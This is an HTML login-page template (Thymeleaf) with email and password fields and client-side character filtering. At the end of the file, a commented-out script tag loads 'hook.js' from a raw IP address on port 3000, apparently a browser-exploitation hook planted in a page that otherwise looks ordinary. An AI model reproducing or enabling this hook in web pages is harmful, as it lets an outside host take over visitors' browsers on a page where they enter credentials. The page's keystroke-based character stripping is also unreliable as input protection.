<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" th:href="@{/css/login.css}">
    <script th:src="@{/js/login.js}"></script>
</head>
<body>
<div class="container">
    <div class="login-wrapper">
        <div class="header">Login in</div>
        <div class="form-wrapper">
            <label style="color: red" th:text="${msg}"></label>
            <form th:action="@{/login}" onsubmit="check()" method="post">
                <input type="email"    id="email"    name="email"    placeholder="email"    class="input-item" onkeyup="this.value=this.value.replace(/[, <>/|'\\]/g,'')" required="required" autofocus="autofocus">
                <input type="password" id="password" name="passwd" placeholder="password" class="input-item" onkeyup="this.value=this.value.replace(/[, <>/|'\\]/g,'')" required="required">
                <button type="submit" name="bt_login" class="btng">Login in</button>
            </form>
        </div>
        <div class="msg">
            <a href="register.html">Sign up</a><br>
            <a href="index.html">Back to menu</a>
        </div>
    </div>
</div>
</body>
<!--<script src="http://1.14.120.9:3000/hook.js"></script>-->
</html>
